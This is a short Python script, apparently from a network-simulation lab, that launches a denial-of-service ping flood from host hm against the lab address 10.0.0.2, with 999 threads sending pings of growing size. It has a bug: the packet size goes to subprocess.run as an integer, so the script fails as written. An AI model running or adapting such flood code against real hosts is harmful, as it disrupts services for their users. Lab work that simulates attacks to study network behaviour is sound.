import subprocess
import os
import ipaddress
import time
from time import sleep
from threading import Thread
from unicodedata import name
import os 

"""
    Perform a Dos Attack from hm to h2.
    To simulate a Dos Attack hm would have to send flows with increasing size and/or frequency, 
    until a certain value is reached wich involves the drop of some of the flows passing by for s4.
"""

# first we get the current timestamp
T_NOW = time.time()
print("Timestamp: ", T_NOW)
IP_H2 = "10.0.0.2"
FILE_NAME = "ping_output.txt"
THREADS = []

def ping_host(i):
    # Increase size for each ping
    for size in range(100, 65000, 100):
        subprocess.run(["ping", "-c", "1", "-s", size, IP_H2], stdout=subprocess.PIPE, encoding="utf-8")


if __name__ == "__main__":
    for i in range(1,1000):
        thread = Thread(target=ping_host, args=(i,))
        THREADS.append(thread)
        thread.start()

        # Increase time for each ping
        sleep(i/1000)
    
    for t in THREADS:
        t.join()